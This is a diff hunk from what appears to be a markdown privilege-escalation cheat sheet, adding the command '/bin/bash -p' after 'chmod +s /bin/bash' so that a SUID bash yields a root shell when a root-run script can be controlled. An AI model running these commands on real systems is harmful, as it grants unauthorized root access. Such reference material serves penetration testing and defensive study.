@@ -224,6 +224,7 @@ https://github.com/redhawkeye/sudo-exploit
 Adding SUID to bash if you can control a binary/script launched by root :
 ```markdown
 chmod +s /bin/bash
+/bin/bash -p
 ```
 
 ### Web
